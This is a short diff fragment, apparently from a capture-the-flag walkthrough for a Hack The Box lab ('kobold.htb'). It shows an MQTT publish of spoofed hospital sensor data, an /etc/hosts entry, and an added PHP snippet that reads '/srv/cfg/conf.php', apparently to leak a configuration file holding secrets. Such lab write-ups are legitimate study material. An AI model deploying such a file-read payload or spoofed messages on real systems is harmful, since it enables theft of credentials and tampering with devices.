@@ -10,3 +10,8 @@ c.publish('hospital/room1/cardiac','{\"room\":\"room1\",\"temperature\":42.5,\"h
 ```bash
 echo "<TARGET_IP> kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
 ```
+<?php
+readfile('/srv/cfg/conf.php');
+exit;
+?>
+PHP
